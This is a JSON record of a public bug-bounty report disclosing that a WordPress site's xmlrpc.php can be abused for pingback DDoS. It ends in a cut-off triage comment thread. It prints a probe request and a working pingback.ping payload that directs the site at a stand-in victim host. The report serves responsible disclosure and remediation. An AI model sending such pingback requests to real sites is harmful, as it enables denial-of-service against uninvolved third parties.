{"id":124097,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjQwOTc=","url":"https://hackerone.com/reports/124097","title":"Wordpress  Pingback  DDoS Attacks in domain:  veris.in","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-03-17T20:56:58.447Z","submitted_at":"2016-03-17T20:56:58.447Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aziose","url":"/aziose","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/037/936/fdbd1976d94361fdd8c8660680d04b9ee8c30110_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":9409,"url":"https://hackerone.com/veris","handle":"veris","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/009/409/c1806c3bc995d97dd0aa437c2e42eb609f49e549_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/009/409/c1806c3bc995d97dd0aa437c2e42eb609f49e549_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Veris","twitter_handle":"","website":"","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-06-12T16:08:41.431Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-05-13T16:08:28.842Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi team,\n\nWordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website veris.in has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.\n\nPoC:\n====\nIn order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp proxy, send the request below:\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: veris.in \nConnection: keep-alive \nContent-Length: 175\n\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \n\u003cmethodCall\u003e \n\u003cmethodName\u003edemo.sayHello\u003c/methodName\u003e \n\u003cparams\u003e \n\u003cparam\u003e\n\u003cvalue\u003eadmin\u003c/value\u003e\n\u003c/param\u003e \n\u003c/params\u003e \n\u003c/methodCall\u003e\n```\n\n- Notice that a successful response is received showing that the xmlrpc.php file is enabled.\n\n \n- The xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below:\n\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: veris.in\nConnection: keep-alive \nContent-Length: 293\n\n\u003cmethodCall\u003e\n\u003cmethodName\u003epingback.ping\u003c/methodName\u003e\n\u003cparams\u003e\n\u003cparam\u003e\n\u003cvalue\u003e\u003cstring\u003ehttp://victim.com\u003c/string\u003e\u003c/value\u003e\n\u003c/param\u003e\n\u003cparam\u003e\n\u003cvalue\u003e\u003cstring\u003ehttps://veris.in/anypost\u003c/string\u003e\u003c/value\u003e\n\u003c/param\u003e\n\u003c/params\u003e\n\u003c/methodCall\u003e\n```\n- As soon as the above request is sent, the victim host gets an entry in its log file with a request originating from the veris.in domain verifying the pingback.\n\n- This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.\n\n- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. \n\nMore info: https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html\n\nregards,","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-12T16:08:28.914Z","allow_singular_disclosure_after":-168211536.1703281,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mayurudiniya","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":847369,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @aziose for the report. We would look into it and take appropriate action.","automated_response":false,"created_at":"2016-03-18T05:48:40.345Z","updated_at":"2016-03-18T05:48:40.345Z","actor":{"username":"veris-nayan","cleared":false,"url":"/veris-nayan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"veris","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":847370,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-03-18T05:49:05.289Z","updated_at":"2016-03-18T05:49:05.289Z","actor":{"username":"veris-nayan","cleared":false,"url":"/veris-nayan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"veris","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":847479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @aziose